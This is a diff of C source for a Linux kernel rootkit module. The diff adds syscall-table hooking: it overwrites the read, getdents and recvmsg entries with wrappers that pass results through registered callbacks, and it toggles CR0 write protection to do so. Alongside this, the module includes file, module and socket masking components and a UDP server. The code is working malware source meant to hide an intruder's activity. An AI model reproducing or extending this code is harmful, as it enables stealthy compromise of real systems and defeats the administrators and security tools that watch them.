@@ -24,6 +24,7 @@
 #include <linux/module.h>		/* Needed by all kernel modules */
 #include <linux/syscalls.h>		/* Needed for __NR_read */
 #include <linux/list.h>			/* Needed for linked list interface */
+#include <linux/slab.h>
 
 #include "sysmap.h"				/* Needed for ROOTKIT_SYS_CALL_TABLE */
 #include "module_masking.h"		/* Needed for ... */
@@ -33,6 +34,7 @@
 #include "socket_masking.h"		/* Needed for ... */
 #include "conf_manager.h"		/* Needed for ... */
 #include "udp_server.h"			/* Needed for ... */
+#include "core.h"
 
 
 MODULE_LICENSE("GPL");
@@ -63,6 +65,19 @@ asmlinkage int (*original_getdents_syscall)(unsigned int, struct linux_dirent *,
 asmlinkage long (*original_readlinkat_syscall)(int , const char __user *, char __user *, int);
 asmlinkage ssize_t (*original_recvmsg_syscall)(int, struct user_msghdr __user *, unsigned);
 
+asmlinkage long generic_read_syscall(unsigned int, char __user *, size_t);
+asmlinkage int generic_getdents_syscall(unsigned int, struct linux_dirent *, unsigned int);
+asmlinkage ssize_t generic_recvmsg_syscall(int, struct user_msghdr __user *, unsigned);
+
+
+
+
+
+
+/* Callback list heads */
+LIST_HEAD(read_callbacks);
+LIST_HEAD(getdents_callbacks);
+LIST_HEAD(recvmsg_callbacks);
 
 /* Declaration of functions */
 static void disable_write_protect_mode(void);
@@ -86,11 +101,13 @@ static int __init core_start(void)
 	syscall_table = (void *) ROOTKIT_SYS_CALL_TABLE;
 	original_read_syscall = (void *) syscall_table[__NR_read];
 	original_getdents_syscall = (void *) syscall_table[__NR_getdents];
-	original_readlinkat_syscall = (void *) syscall_table[__NR_readlinkat];
+	//original_readlinkat_syscall = (void *) syscall_table[__NR_readlinkat];
 	original_recvmsg_syscall = (void *) syscall_table[__NR_recvmsg];
 
 	/* Overwrite manipulated syscall */
-	//...
+	syscall_table[__NR_read] = generic_read_syscall;
+	syscall_table[__NR_getdents] = generic_getdents_syscall;
+	syscall_table[__NR_recvmsg] = generic_recvmsg_syscall;
 
 	enable_write_protect_mode();
 
@@ -120,7 +137,6 @@ static void __exit core_end(void)
 	/* Restore original read syscall */
 	syscall_table[__NR_read] = (unsigned long *) original_read_syscall;
 	syscall_table[__NR_getdents] = (unsigned long *) original_getdents_syscall;
-	syscall_table[__NR_readlinkat] = (unsigned long *) original_readlinkat_syscall;
 	syscall_table[__NR_recvmsg] = (unsigned long *) original_recvmsg_syscall;
 
 	enable_write_protect_mode();
@@ -160,6 +176,115 @@ void enable_write_protect_mode(void)
 	/* Enable `write-protect` mode. Do so by setting the WP (Write protect)
 	   bit to 1. When set to 1, the CPU can't write to read-only pages */
 	write_cr0(original_cr0 | CR0_WRITE_PROTECT_MASK);
+}
+
+
+void register_callback(unsigned int callback_nr, void *callback)
+{
+	struct list_head *to_insert = NULL;
+	struct callback *cb = kzalloc(sizeof(struct callback), GFP_KERNEL);
+
+	switch (callback_nr) {
+	case __NR_read:
+		to_insert = &read_callbacks;
+		break;
+
+	case __NR_getdents:
+		to_insert = &getdents_callbacks;
+		break;
+
+	case __NR_recvmsg:
+		to_insert = &recvmsg_callbacks;
+		break;
+
+	default:
+		return;
+	}
+
+	PRINT("INSERT\n");
+
+	cb->cb = callback;
+	list_add(&(cb->list), to_insert);
+}
+
+void deregister_callback(unsigned int callback_nr, void *callback)
+{
+	struct list_head *to_delete;
+	struct callback *cb = NULL;
+
+	switch (callback_nr) {
+	case __NR_read:
+		to_delete = &read_callbacks;
+		break;
+
+	case __NR_getdents:
+		to_delete = &getdents_callbacks;
+		break;
+
+	case __NR_recvmsg:
+		to_delete = &recvmsg_callbacks;
+		break;
+
+	default:
+		return;
+	}
+
+	list_for_each_entry(cb, to_delete, list)
+		if (cb->cb == callback) {
+			list_del(&(cb->list));
+			kfree(cb);
+			return;
+		}
+
+}
+
+typedef asmlinkage long (*my_read_syscall)(unsigned int, char __user *, size_t, long);
+typedef asmlinkage int (*my_getdents_syscall)(unsigned int, struct linux_dirent *, unsigned int, int);
+typedef asmlinkage ssize_t (*my_recvmsg_syscall)(int, struct user_msghdr __user *, unsigned, ssize_t);
+
+
+asmlinkage long generic_read_syscall(unsigned int fd, char __user *buf, size_t count)
+{
+	long ret;
+	struct callback *cb;
+
+	/* Call original sycall */
+	ret = original_read_syscall(fd, buf, count);
+
+	list_for_each_entry(cb, &read_callbacks, list)
+		ret = ((my_read_syscall)cb->cb)(fd, buf, count, ret);
+
+	return ret;
+}
+
+
+asmlinkage int generic_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
+{
+	int ret;
+	struct callback *cb;
+
+	/* Call original sycall */
+	ret = original_getdents_syscall(fd, dirp, count);
+
+	list_for_each_entry(cb, &getdents_callbacks, list)
+		ret = ((my_getdents_syscall)cb->cb)(fd, dirp, count, ret);
+
+	return ret;
+}
+
+
+asmlinkage ssize_t generic_recvmsg_syscall(int sockfd, struct user_msghdr __user *msg, unsigned flags)
+{
+	ssize_t ret;
+	struct callback *cb;
+
+	/* Call original sycall */
+	ret = original_recvmsg_syscall(sockfd, msg, flags);
+
+	list_for_each_entry(cb, &recvmsg_callbacks, list)
+		ret = ((my_recvmsg_syscall)cb->cb)(sockfd, msg, flags, ret);
+
+	return ret;
 }
 
 
